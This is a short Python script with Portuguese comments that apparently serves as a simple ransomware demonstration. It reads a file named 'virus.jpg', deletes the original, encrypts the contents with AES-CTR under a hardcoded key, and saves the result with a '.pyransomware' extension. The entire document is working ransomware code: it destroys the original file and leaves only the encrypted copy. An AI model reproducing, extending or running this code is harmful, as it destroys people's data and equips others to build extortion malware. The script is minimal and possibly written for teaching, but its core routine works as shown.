import os  # Utiliza algumas funções do sistema operacional
import pyaes  # Utiliza a biblioteca pyaes para criptografia AES

# Abre o arquivo de imagem e leia o conteúdo
file_name = "virus.jpg"  # Nome do arquivo a ser criptografado
file = open(file_name, "rb")  # Abre o arquivo em modo de leitura binária
file_data = file.read()  # Lê o conteúdo do arquivo
file.close()  # Fecha o arquivo

# Remove o arquivo original
os.remove(file_name)  # Remove o arquivo original, deixando apenas os dados a serem criptografados

# Cria uma chave de 16 bytes (em formato bytes)
key = b"0123456789abcdef"  # Chave de 16 bytes para criptografia AES
aes = pyaes.AESModeOfOperationCTR(key)  # Configura AES-CTR com a chave
cryptodata = aes.encrypt(file_data)  # Criptografa os dados lidos

# Grava o arquivo criptografado
new_file_name = file_name + ".pyransomware"  # Nome do novo arquivo criptografado
new_file = open(new_file_name, "wb")  # Abre o novo arquivo em modo de escrita binária
new_file.write(cryptodata)  # Escreve os dados criptografados no novo arquivo
new_file.close()  # Fecha o novo arquivo
